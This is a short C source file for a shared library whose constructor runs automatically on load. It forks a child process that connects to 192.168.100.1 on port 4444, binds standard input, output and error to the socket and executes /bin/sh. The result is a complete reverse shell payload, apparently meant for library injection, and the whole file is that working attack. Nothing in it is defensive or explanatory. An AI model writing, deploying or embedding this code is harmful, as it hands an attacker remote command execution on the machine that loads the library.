#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor))
int foo(void)
{   
    printf("hi from reverse lib\n");
	char b[4096];
    int port = 4444;
    struct sockaddr_in revsockaddr;
    int sockt;
    int pid = fork();

    if(pid == 0) { //child
        
        sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("192.168.100.1");

        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);

    }
    
	/* we won't get another opportunity to execute */
}